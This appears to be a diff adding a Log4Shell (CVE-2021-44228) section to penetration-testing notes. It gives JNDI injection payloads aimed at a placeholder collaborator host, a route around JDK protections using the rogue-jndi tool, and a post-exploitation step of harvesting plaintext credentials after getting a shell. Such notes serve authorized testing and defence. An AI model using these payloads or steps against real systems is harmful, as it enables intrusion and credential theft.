@@ -39,6 +39,19 @@ Patterns that repeat across products:
 - exposed or weakly protected helper endpoints
 - attachment or document processors with side-fetch behavior
 - optimistic trust in public keys, import maps, or external config
+- JNDI lookups in logged/evaluated strings (Log4Shell pattern — any Java app using Log4j 2.x < 2.17)
+
+## Log4Shell and JNDI family (CVE-2021-44228)
+
+Affects any Java application using Log4j 2.0-beta9 through 2.14.1. The logger evaluates `${jndi:ldap://...}` in message strings, triggering outbound LDAP/RMI connections to attacker infrastructure.
+
+**Detection:** inject `${jndi:ldap://COLLABORATOR/x}` or `${jndi:dns://COLLABORATOR/x}` into any input the app might log (login fields, headers, user-agent, search queries, form values, URL paths).
+
+**Exploitation on modern JDK (8u191+):** remote classloading blocked. Use BeanFactory/ELProcessor via `rogue-jndi` tool's `o=tomcat` route. Requires Tomcat on classpath (common: Spring Boot, UniFi, Solr, many enterprise apps).
+
+**Post-exploitation pattern:** many Java applications (UniFi, Solr, Jenkins, etc.) have internal databases or configs with plaintext credentials. After initial shell, enumerate local services.
+
+**Related CVEs:** CVE-2021-45046 (bypass of 2.15.0 fix), CVE-2021-45105 (DoS), CVE-2021-44832 (JDBC appender RCE). Spring4Shell (CVE-2022-22965) uses similar classloader manipulation but different entry point.
 
 ## Modern framework pivots
 
